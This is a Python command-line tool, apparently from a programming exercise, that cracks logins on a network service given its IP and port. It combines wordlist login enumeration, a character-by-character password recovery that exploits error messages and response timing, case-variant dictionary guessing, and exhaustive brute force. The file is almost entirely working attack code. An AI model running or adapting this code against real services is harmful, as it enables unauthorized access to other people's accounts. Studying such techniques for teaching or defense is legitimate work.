import argparse
import socket
import string
import itertools
import json
from datetime import datetime
from datetime import timedelta


def create_json_credentials(raw_login, raw_password):
    return json.dumps(
        {
            "login": str(raw_login),
            "password": str(raw_password)
        })


class PasswordHacker:
    MAX_TRIES = 100_000_000
    BUFFER_SIZE = 32768
    ACCEPTED_CHARS = string.ascii_letters + string.digits
    n_ph = 0

    def __init__(self, ip_address, port):
        self.ip_address = ip_address
        self.port = port

    def __new__(cls, *args, **kwargs):
        if cls.n_ph == 0:
            cls.n_ph += 1
            return object.__new__(cls)
        return None

    def __repr__(self):
        return f'Password Hacker object with:\n' \
               f'IP ADDRESS: {self.ip_address}\n' \
               f'PORT: {self.port}\n'

    def __str__(self):
        return self.__repr__()

    # Algorithm used when the server sends guiding messages like 'wrong password'
    # It measures time between send and receive bytes to check is server is not catching exceptions
    # Uses json module to serialize sent and received messages
    def vulnerability_brute_force(self, login_dict_path):
        with socket.socket() as hacking_socket, \
                open(login_dict_path, 'r', encoding='utf-8') as login_file:
            hacking_socket.connect((self.ip_address, self.port))
            found_login = False
            for login in login_file:
                login = login.rstrip('\n')
                json_credentials = create_json_credentials(login, ' ').encode()
                hacking_socket.send(json_credentials)
                received_msg = json.loads(hacking_socket.recv(self.BUFFER_SIZE).decode())
                if received_msg['result'] == 'Wrong password!':
                    found_login = True
                    break
            if not found_login:
                return None

            password = ''
            iterator = itertools.product(self.ACCEPTED_CHARS)
            while True:
                try:
                    password += ''.join(next(iterator))
                    json_credentials = create_json_credentials(login, password)
                    send_time = datetime.now()
                    hacking_socket.send(json_credentials.encode())
                    received_msg = json.loads(hacking_socket.recv(self.BUFFER_SIZE).decode())
                    receive_time = datetime.now()
                    time = receive_time - send_time
                    if received_msg['result'] == 'Connection success!':
                        return json_credentials
                    elif received_msg['result'] == 'Exception happened during login' or time > timedelta(milliseconds=50):
                        iterator = itertools.product(self.ACCEPTED_CHARS)
                        continue
                    else:
                        password = password[:-1]
                except StopIteration:
                    return None

    # Algorithm used when user password might be one
    # of most typical passwords from external text file
    def dictionary_brute_force(self, dict_path):
        with socket.socket() as hacking_socket, \
                open(dict_path, 'r', encoding='utf-8') as dict_file:
            hacking_socket.connect((self.ip_address, self.port))
            for password in dict_file:
                password = password.strip('\n')
                combinations = list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(),
                                                                                   letter.upper()] for letter in
                                                                                  password))))
                for combination in combinations:
                    enc_password = combination.encode()
                    hacking_socket.send(enc_password)
                    if hacking_socket.recv(self.BUFFER_SIZE).decode() == 'Connection success!':
                        return enc_password.decode()
            return None

    # Simple brute force algorithm, absolutely random
    def brute_force(self):
        with socket.socket() as hacking_socket:
            hacking_socket.connect((self.ip_address, self.port))
            tries = 0
            r = 1
            iterator = itertools.product(self.ACCEPTED_CHARS, repeat=r)
            while tries <= self.MAX_TRIES:
                try:
                    enc_password = ''.join(next(iterator)).encode()
                    hacking_socket.send(enc_password)
                    if hacking_socket.recv(self.BUFFER_SIZE).decode() == 'Connection success!':
                        return enc_password.decode()
                except StopIteration:
                    r += 1
                    iterator = itertools.product(self.ACCEPTED_CHARS, repeat=r)
            return None


def main():
    parser = argparse.ArgumentParser(description='Process IP address, port, message for sending.')
    parser.add_argument('ip_address', metavar='IP', help='IP address for connection.')
    parser.add_argument('port', type=int, help='Port to connect.')
    args = parser.parse_args()

    password_hacker = PasswordHacker(args.ip_address, args.port)
    # Set the algorithm
    result = password_hacker.vulnerability_brute_force('logins.txt')

    if result is None:
        print('-> Password not found <-')
    else:
        print(result)


if __name__ == '__main__':
    main()
